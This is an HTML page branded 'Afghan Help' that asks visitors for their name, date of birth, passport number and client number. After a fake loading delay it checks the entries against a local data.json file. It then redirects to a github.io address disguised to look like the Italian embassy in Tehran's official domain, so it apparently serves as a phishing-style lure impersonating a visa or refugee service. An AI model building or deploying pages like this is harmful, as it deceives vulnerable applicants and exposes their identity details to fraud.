<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Track your UC Details</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      background-color: #f1f1f1; /* رنگ پس‌زمینه پیش‌فرض */
    }

    header {
      background-color: #FFFFFF;
      padding: 20px;
      text-align: center;
    }

    header img {
      width: 150px;
      display: block;
      margin: 0 auto;
    }

    header h1 {
      margin-top: 10px;
      font-size: 24px;
      font-weight: bold;
      color: #004466;
    }

    main {
      flex: 1;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    form {
      max-width: 400px;
      width: 100%;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      box-sizing: border-box;
      font-size: 16px;
    }

    button {
      background-color: #004466;
      color: white;
      border: none;
      cursor: pointer;
    }

    button:hover {
      background-color: #006699;
    }

    #error {
      color: red;
      display: none;
    }

    /* Loading screen style */
    #loadingScreen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(255, 255, 255, 1); /* پس‌زمینه سفید */
      z-index: 9999; /* To make sure it's on top of everything */
      justify-content: center;
      align-items: center;
      display: flex;
      text-align: center;
    }

    #loadingScreen img {
      width: 100px;
      height: 100px;
    }

    footer {
      background-color: #f1f1f1;
      padding: 10px;
      text-align: center;
    }

    .social a {
      margin: 0 10px;
      text-decoration: none;
      color: #004466;
      font-weight: bold;
    }

    @media (max-width: 600px) {
      header h1 {
        font-size: 20px;
      }
    }
  </style>
</head>
<body>

  <header>
    <img src="logo.png" alt="Logo" class="logo">
    <h1>Afghan Help</h1>
  </header>

  <main>
    <form id="verifyForm">
      <input type="text" id="name" placeholder="Name" required />
      <input type="text" id="lastname" placeholder="Last Name" required />
      <input type="date" id="dob" placeholder="Date of Birth" required />
      <input type="text" id="passport" placeholder="Passport No (Optional)" />
      <input type="text" id="clientno" placeholder="Client No" required />
      <button type="submit">Tracking</button>
      <p id="error">Incorrect information entered!</p>
    </form>
  </main>

  <!-- Loading Screen -->
  <div id="loadingScreen">
    <img src="Loading.gif" alt="Loading...">
  </div>

  <footer>
    <div class="social">
      <a href="https://instagram.com" target="_blank">Instagram</a>
      <a href="https://youtube.com" target="_blank">YouTube</a>
      <a href="https://x.com" target="_blank">X</a>
    </div>
  </footer>

  <script>
    document.getElementById('verifyForm').addEventListener('submit', function (e) {
      e.preventDefault();
      document.getElementById('error').style.display = 'none';
      document.getElementById('loadingScreen').style.display = 'flex'; // نمایش صفحه بارگذاری

      // تغییر پس‌زمینه به سفید
      document.body.style.backgroundColor = "#ffffff";

      setTimeout(() => {
        fetch('data.json')
          .then(response => response.json())
          .then(data => {
            const name = document.getElementById('name').value.trim();
            const lastname = document.getElementById('lastname').value.trim();
            const dob = document.getElementById('dob').value.trim();
            const clientno = document.getElementById('clientno').value.trim();

            document.getElementById('loadingScreen').style.display = 'none'; // مخفی کردن صفحه بارگذاری
            document.body.style.backgroundColor = "#f1f1f1"; // بازگرداندن رنگ پس‌زمینه اصلی

            if (
              name === data.name &&
              lastname === data.lastname &&
              dob === data.dob &&
              clientno === data.clientno
            ) {
              window.location.href = 'https://ambteheran.github.io/https-ambteheran.esteri.it-it-/';
            } else {
              document.getElementById('error').style.display = 'block';
            }
          })
          .catch(err => {
            document.getElementById('loadingScreen').style.display = 'none';
            document.body.style.backgroundColor = "#f1f1f1"; // بازگرداندن رنگ پس‌زمینه در صورت خطا
            console.error('Error loading data.json:', err);
          });
      }, 3000);
    });
  </script>

</body>
</html>
